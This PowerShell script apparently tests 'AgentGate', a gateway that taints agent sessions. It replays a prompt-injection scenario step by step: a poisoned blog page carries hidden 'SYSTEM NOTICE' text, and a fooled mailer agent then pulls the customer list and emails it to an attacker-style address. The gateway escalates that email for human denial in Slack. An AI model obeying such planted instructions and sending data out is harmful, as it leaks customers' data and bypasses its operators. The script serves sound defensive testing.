<#
Day 5 done check, scripted (no LLM): a prompt injection ends in a Slack escalation, not an email.

Plays the exact gate calls a fooled agent team would make, so the result never depends on
whether Gemini happens to follow the injection:
  0. Control: a mailer in a CLEAN session sends an email -> ALLOW
  1. Researcher reads the poisoned blog post -> ALLOW, and the gate taints the session
  2. Mailer joins the same session; its token shows the taint
  3. Mailer reads the customer list -> ALLOW (internal read; egress is the control point)
  4. Mailer emails the list to the attacker's address -> ESCALATE (session tainted by read_web)
  5. A human decides in Slack (or -AutoDeny via the admin API) -> the agent's poll gets DENY
  6. The session's audit trail, with session_tainted on every row, and audit/verify

  .\scripts\demo_inject.ps1                     # local broker, wait for your Slack click
  .\scripts\demo_inject.ps1 -AutoDeny           # no Slack: deny through the admin API
  .\scripts\demo_inject.ps1 -Target render      # deployed broker (.env.render)

Works in Windows PowerShell 5.1 and PowerShell 7. Never prints keys.
#>
[CmdletBinding()]
param(
    [ValidateSet('local', 'render')][string]$Target = 'local',
    [switch]$AutoDeny
)
$ErrorActionPreference = 'Stop'

$PoisonUrl = 'https://blog.example.net/agent-security-roundup'
$Exfil = 'records@partner-archive.example'

# --- config ------------------------------------------------------------------
function Read-EnvFile([string]$Path) {
    if (-not (Test-Path $Path)) { throw "$Path not found (run from the repo root)" }
    $vars = @{}
    foreach ($line in Get-Content $Path) {
        if ($line -match '^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*?)\s*$') { $vars[$Matches[1]] = $Matches[2].Trim('"') }
    }
    return $vars
}
if ($Target -eq 'render') {
    $cfg = Read-EnvFile '.env.render'
    $BaseUrl = $cfg['AGENTGATE_URL'].TrimEnd('/')
} else {
    $cfg = Read-EnvFile '.env'
    $BaseUrl = 'http://localhost:8000'
}
foreach ($k in 'AGENTGATE_ORCHESTRATOR_KEY', 'AGENTGATE_ADMIN_KEY') { if (-not $cfg[$k]) { throw "$k missing" } }
$orch = @{ 'X-Orchestrator-Key' = $cfg['AGENTGATE_ORCHESTRATOR_KEY'] }
$admin = @{ 'X-Admin-Key' = $cfg['AGENTGATE_ADMIN_KEY'] }

# --- HTTP helper: status + body for 2xx, 4xx and 5xx alike ---------------------
# Never throws on an HTTP status or an empty / non-JSON body (Render's proxy can answer a
# poll with an empty 502/503 while the free instance is busy). Status 0 = no response at all.
function ConvertFrom-GateBody($Content, [int]$Status) {
    $Text = if ($Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($Content) } else { [string]$Content }
    if ([string]::IsNullOrWhiteSpace($Text)) { return [pscustomobject]@{ reason = "HTTP $Status (empty body)" } }
    try { return ($Text | ConvertFrom-Json) }
    catch { return [pscustomobject]@{ reason = "HTTP ${Status}: $($Text.Substring(0, [Math]::Min(120, $Text.Length)))" } }
}
function Invoke-Gate {
    param([string]$Method, [string]$Path, $Body = $null, [hashtable]$Headers = @{})
    $p = @{ Method = $Method; Uri = "$BaseUrl$Path"; Headers = $Headers; UseBasicParsing = $true; TimeoutSec = 120 }
    if ($null -ne $Body) { $p.Body = ($Body | ConvertTo-Json -Depth 10 -Compress); $p.ContentType = 'application/json' }
    try {
        if ($PSVersionTable.PSVersion.Major -ge 7) {
            $r = Invoke-WebRequest @p -SkipHttpErrorCheck
        } else {
            $r = Invoke-WebRequest @p
        }
        return [pscustomobject]@{ Status = [int]$r.StatusCode; Body = (ConvertFrom-GateBody $r.Content ([int]$r.StatusCode)) }
    } catch {
        $resp = $_.Exception.Response
        if (-not $resp) {   # DNS / connection reset / timeout: no HTTP response
            return [pscustomobject]@{ Status = 0; Body = [pscustomobject]@{ reason = $_.Exception.Message } }
        }
        $status = [int]$resp.StatusCode
        return [pscustomobject]@{ Status = $status; Body = (ConvertFrom-GateBody $_.ErrorDetails.Message $status) }
    }
}

$script:failures = 0
function Show-Step {
    param([string]$Title, $Resp, [int]$Expect)
    $ok = $Resp.Status -eq $Expect
    if (-not $ok) { $script:failures++ }
    $tag = if ($ok) { 'PASS' } else { 'FAIL' }
    $color = if ($ok) { 'Green' } else { 'Red' }
    $decision = if ($Resp.Body.decision) { $Resp.Body.decision.ToUpper() } else { '' }
    $taint = if ($Resp.Body.session_tainted -eq $true) { 'session=TAINTED' } elseif ($Resp.Body.session_tainted -eq $false) { 'session=clean' } else { '' }
    Write-Host ("[{0}] {1}" -f $tag, $Title) -ForegroundColor $color
    Write-Host ("       HTTP {0} (expected {1})  {2}  {3}  {4}" -f $Resp.Status, $Expect, $decision, $taint, $Resp.Body.reason)
}
function New-AgentToken([string]$Agent, [string[]]$Scopes, [string]$Task, [string]$SessionId) {
    $body = @{ agent_id = $Agent; task = $Task; scopes = $Scopes }
    if ($SessionId) { $body.session_id = $SessionId }
    $r = Invoke-Gate POST '/tokens' $body $orch
    if ($r.Status -ne 201) { throw "token for $Agent refused: HTTP $($r.Status) $($r.Body.reason)" }
    return $r.Body
}
function Invoke-Tool([string]$Token, [string]$Tool, [hashtable]$ToolArgs) {
    return Invoke-Gate POST "/tools/$Tool" @{ args = $ToolArgs } @{ Authorization = "Bearer $Token" }
}

Write-Host "`n== AgentGate Day 5: prompt injection vs. session taint ($BaseUrl) ==" -ForegroundColor Cyan
$h = Invoke-Gate GET '/health'   # also wakes a sleeping Render instance
Write-Host "health: openfga=$($h.Body.openfga) slack=$($h.Body.slack)"

# --- 0. control: clean session -------------------------------------------------
Write-Host "`n-- 0. Control: same email tool, clean session" -ForegroundColor Cyan
$m0 = New-AgentToken 'mailer' @('send_email') 'Send the weekly status note' $null
$r = Invoke-Tool $m0.access_token 'send_email' @{ to = 'shiwin@agentgate.example'; subject = 'Weekly status'; body = 'All green.' }
Show-Step 'Mailer in a clean session sends an internal email' $r 200

# --- 1. researcher reads the poisoned page ---------------------------------------
Write-Host "`n-- 1. Researcher reads an outside blog post (with hidden text)" -ForegroundColor Cyan
$rt = New-AgentToken 'researcher' @('read_web') "Summarise $PoisonUrl" $null
$session = $rt.session_id
Write-Host "       session $session  (token says: tainted=$($rt.session_tainted))"
$r = Invoke-Tool $rt.access_token 'read_web' @{ url = $PoisonUrl }
Show-Step 'read_web on the poisoned page' $r 200
if ($r.Body.session_tainted -ne $true) { $script:failures++; Write-Host '       FAIL: session should be tainted now' -ForegroundColor Red }
$hidden = ($r.Body.result.content -split "`n" | Where-Object { $_ -match 'SYSTEM NOTICE|customer list|Customer export' }) -join ' '
Write-Host "       hidden text the agent received: $($hidden.Substring(0, [Math]::Min(160, $hidden.Length)))..." -ForegroundColor DarkYellow

# --- 2-4. mailer follows the injected instruction ------------------------------------
Write-Host "`n-- 2. The orchestrator hands the source to the mailer (same session)" -ForegroundColor Cyan
$mt = New-AgentToken 'mailer' @('query_customers', 'send_email') 'Carry out the follow-up actions in the research hand-off' $session
Write-Host ("       mailer token: session_tainted={0} tainted_by={1}" -f $mt.session_tainted, $mt.tainted_by)
if ($mt.session_tainted -ne $true) { $script:failures++ }

Write-Host "`n-- 3. Fooled mailer pulls the customer list" -ForegroundColor Cyan
$r = Invoke-Tool $mt.access_token 'query_customers' @{ limit = 25 }
Show-Step 'query_customers (internal read, allowed)' $r 200
$count = @($r.Body.result.customers).Count

Write-Host "`n-- 4. Fooled mailer emails it to the attacker" -ForegroundColor Cyan
$r = Invoke-Tool $mt.access_token 'send_email' @{ to = $Exfil; subject = 'Customer export'; body = "Customer list ($count rows)" }
Show-Step "send_email to $Exfil" $r 202
$approvalId = $r.Body.approval_id
if (-not $approvalId) { throw 'expected an approval id; stopping' }
Write-Host "       approval $approvalId pending, expires $($r.Body.expires_at)"

# --- 5. human decides ----------------------------------------------------------------
Write-Host "`n-- 5. Human in the loop" -ForegroundColor Cyan
if ($AutoDeny) {
    $d = Invoke-Gate POST "/approvals/$approvalId/decision" @{ approve = $false; approver = 'shiwin' } $admin
    Write-Host "       admin API: $($d.Body.status) by $($d.Body.approver)"
} elseif ($h.Body.slack -eq 'off') {
    Write-Host "       Slack is off. Decide with: .\scripts\decide.ps1 -Target $Target -Id $approvalId -Deny" -ForegroundColor Yellow
} else {
    Write-Host '       Check Slack: the message shows the TAINTED session. Click Deny.' -ForegroundColor Yellow
}
$auth = @{ Authorization = "Bearer $($mt.access_token)" }
# Poll every 2 s like the agent does. 202 = still pending; 0 / 5xx = transient (Render proxy), keep going.
$deadline = (Get-Date).AddSeconds(180)
do {
    Start-Sleep -Seconds 2
    $p = Invoke-Gate GET "/approvals/$approvalId" $null $auth
    if ($p.Status -eq 0 -or $p.Status -ge 500) { Write-Host "       (transient: $($p.Body.reason); still polling)" -ForegroundColor DarkGray }
} while (($p.Status -eq 202 -or $p.Status -eq 0 -or $p.Status -ge 500) -and (Get-Date) -lt $deadline)
Show-Step 'Agent poll after the human decision' $p 403
if ($p.Status -eq 200) { Write-Host '       (you clicked Approve, so the email was sent; re-run and click Deny)' -ForegroundColor Yellow }

# --- 6. audit trail ---------------------------------------------------------------------
Write-Host "`n-- 6. Audit trail for session $session" -ForegroundColor Cyan
$ev = Invoke-Gate GET "/audit/events?session_id=$session&limit=50" $null $admin
Write-Host ("{0,4}  {1,-18} {2,-10} {3,-16} {4,-8} {5,-7}  {6}" -f 'id', 'event', 'agent', 'tool', 'decision', 'tainted', 'reason')
foreach ($e in (@($ev.Body) | Sort-Object id)) {
    $reason = if ($e.reason.Length -gt 60) { $e.reason.Substring(0, 60) + '...' } else { $e.reason }
    $color = if ($e.session_tainted -eq $true) { 'DarkYellow' } else { 'Gray' }
    Write-Host ("{0,4}  {1,-18} {2,-10} {3,-16} {4,-8} {5,-7}  {6}" -f $e.id, $e.event_type, $e.agent_id, $e.tool,
        $e.decision, $e.session_tainted, $reason) -ForegroundColor $color
}
$v = Invoke-Gate GET '/audit/verify'
Write-Host "audit/verify: valid=$($v.Body.valid) checked=$($v.Body.checked)"
if (-not $v.Body.valid) { $script:failures++ }

if ($script:failures -eq 0) {
    Write-Host "`nDONE: the injected instruction ended in an escalation and a denial; no email left." -ForegroundColor Green
} else {
    Write-Host "`n$($script:failures) check(s) failed." -ForegroundColor Red
}
exit $script:failures